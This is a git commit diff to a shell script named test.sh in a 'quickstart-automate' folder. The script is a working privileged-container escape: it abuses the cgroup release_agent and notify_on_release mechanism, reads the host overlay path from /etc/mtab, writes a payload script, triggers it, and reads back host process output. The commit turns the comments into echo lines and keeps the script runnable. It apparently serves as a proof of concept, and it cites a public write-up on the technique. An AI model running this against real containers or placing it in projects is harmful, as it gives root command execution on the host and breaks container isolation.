47fea0251eee6565ae87f538e16974d015d51d03
Juan José López Jaimez <jjlopezjaimez@google.com>
2022-10-27 16:34:07 -0400

    aaa

--- quickstart-automate/test.sh
+++ quickstart-automate/test.sh
@@ -1,18 +1,19 @@
-# Finds + enables a cgroup release_agent
+#!/bin/sh
+echo Finds + enables a cgroup release_agent
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
-# Enables notify_on_release in the cgroup
+echo Enables notify_on_release in the cgroup
 mkdir -p $d/w; echo 1 > $d/w/notify_on_release
-# Finds path of OverlayFS mount for container
+echo Finds path of OverlayFS mount for container
 # Unless the configuration explicitly exposes the mount point of the host filesystem
 # see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-# Sets release_agent to /path/payload
+echo Sets release_agent to /path/payload
 touch /o; echo $t/c > $d/release_agent
-# Creates a payload
+echo Creates a payload
 echo "#!/bin/sh" > /c
 echo "ps > $t/o" >> /c
 chmod +x /c
-# Triggers the cgroup via empty cgroup.procs
+echo Triggers the cgroup via empty cgroup.procs
 sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
-# Reads the output
+echo Reads the output
 cat /o
